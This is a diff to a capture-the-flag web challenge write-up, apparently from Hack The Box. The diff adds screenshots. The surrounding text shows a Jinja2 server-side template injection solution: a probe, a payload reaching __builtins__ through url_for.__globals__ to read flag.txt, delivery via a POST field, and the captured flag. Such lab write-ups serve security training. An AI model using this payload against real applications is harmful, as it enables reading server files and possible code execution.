@@ -1,4 +1,4 @@
-## Trial by Fire
+![image](https://github.com/user-attachments/assets/183ffdf6-66a1-4ed1-8899-1ddcd9a26a65)## Trial by Fire
 
 Category: Web  
 
@@ -17,6 +17,7 @@ Output still showed `{{7*7}}` (escaped).
 
 Found hidden button using DevTools (CTRL + F → search "leet").  
 Clue appeared:
+![image](https://github.com/user-attachments/assets/0038997c-6d0a-4c46-b834-377e607e51cb)
 
 ```
 {{ url_for.globals }}
@@ -34,8 +35,12 @@ Final Payload:
 {{ url_for.__globals__['__builtins__']['open']('flag.txt').read() }}
 ```
 
-- POST to `/begin` with warrior_name = payload  
+- POST to `/begin` with warrior_name = payload
+![image](https://github.com/user-attachments/assets/2cf3f09b-0c64-4b02-bec4-e5d99f277a50)
+
 - Trigger `/battle-report`
+
+![image](https://github.com/user-attachments/assets/bf24535a-f708-436c-964d-c8fc2d896532)
 
 ```
 HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_ab21d35eb28870ad67229305ddfd57dc}
